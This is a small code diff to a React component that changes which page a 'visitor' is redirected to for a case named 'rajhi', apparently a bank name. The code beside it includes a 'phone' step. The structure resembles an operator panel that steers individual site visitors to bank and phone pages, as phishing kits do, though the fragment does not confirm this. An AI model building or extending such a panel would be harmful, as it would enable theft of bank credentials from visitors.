@@ -89,8 +89,8 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
           break;
         case "rajhi":
           updates = {
-            redirectPage: "step6" as any,
-            currentStep: "step6" as any,
+            redirectPage: "rajhi" as any,
+            currentStep: "rajhi" as any,
           };
           break;
         case "phone":
